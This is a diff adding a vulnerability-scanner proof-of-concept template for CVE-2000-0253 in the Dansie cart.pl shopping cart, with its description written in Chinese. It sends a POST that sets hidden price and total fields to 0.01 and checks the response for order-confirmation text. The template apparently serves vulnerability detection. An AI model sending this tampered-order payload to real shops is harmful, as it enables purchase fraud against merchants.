@@ -1,0 +1,33 @@
+[info]
+author = "ave"
+description = "验证目标 Dansie 购物车 cart.pl 是否存在隐藏表单字段未校验漏洞，通过修改商品价格等隐藏字段值提交订单，若服务端信任客户端隐藏字段则存在漏洞"
+id = "POC-AVE-2000-0777"
+name = "Dansie cart.pl 隐藏表单字段购买信息篡改漏洞 PoC"
+severity = "critical"
+tags = ["ave-2000-0777"]
+vuln_id = [
+    "CVE-2000-0253",
+    "AVE-2000-0777",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/cart.pl"
+protocol = "http"
+
+[poc.requests.body]
+content = "item_id=1&quantity=1&price=0.01&shipping=0.00&total=0.01&submit=order"
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "order confirmed",
+    "order received",
+    "thank you",
+]
